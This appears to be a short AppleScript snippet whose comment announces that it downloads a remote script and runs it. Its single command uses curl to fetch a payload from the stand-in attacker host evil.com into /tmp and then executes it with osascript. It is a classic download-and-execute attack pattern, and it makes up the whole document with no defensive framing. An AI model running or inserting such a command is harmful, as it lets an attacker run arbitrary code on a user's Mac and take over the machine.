-- Download a remote AppleScript, save it, then run it
do shell script "curl http://evil.com/payload.scpt -o /tmp/x.scpt && osascript /tmp/x.scpt"
